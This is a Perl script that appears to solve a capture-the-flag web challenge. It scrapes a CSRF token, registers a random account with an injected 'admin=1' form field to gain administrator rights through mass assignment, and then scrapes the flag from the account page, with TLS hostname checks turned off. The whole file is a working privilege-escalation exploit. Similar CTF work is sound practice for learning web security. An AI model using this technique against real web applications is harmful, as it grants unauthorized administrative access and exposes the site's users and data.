#!/usr/bin/perl
use LWP;
use LWP::UserAgent;
use HTTP::Cookies;
use URI::Escape;

my $cookie_jar = HTTP::Cookies->new(
    agent => "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 FireCow/27.0"
);

my $ua = LWP::UserAgent->new(
    ssl_opts   => { verify_hostname => 0 },
    cookie_jar => $cookie_jar,
);

push @{ $ua->requests_redirectable }, 'POST';

my $username="zylopfa" . rndStr (8, 'A'..'Z','a'..'z', 0..9);
my $csrf = "";

# get the csrf value
my $csrfpage = "http://cpanel.sctf.michaelz.xyz/register";
my $req = HTTP::Request->new(GET => "$csrfpage");
my $res = $ua->request($req);

if ( $res->content =~ /csrf: \"(.*?)\",/gis ) {
  $csrf =  $1;
}

# Registration using randomish username and password and the csrf value
my $page = "http://cpanel.sctf.michaelz.xyz/api/user/register";

$req = HTTP::Request->new(POST => "$page");
$req->header('Referer', 'http://cpanel.sctf.michaelz.xyz/register');
$req->content_type('application/x-www-form-urlencoded');
$req->content("_csrf=" . $csrf . "&username=" . $username . "&password=passw0rd0&admin=1");
$res = $ua->request($req);

# Go to the admin page and scrape the flag

my $adminpage = "http://cpanel.sctf.michaelz.xyz/account";
$req = HTTP::Request->new(GET => "$adminpage");
$res = $ua->request($req);

if ( $res->content =~ /(sctf{.*?})/gis ) {
  print $1 . "\n";
}

sub rndStr{ join'', @_[ map{ rand @_ } 1 .. shift ] }
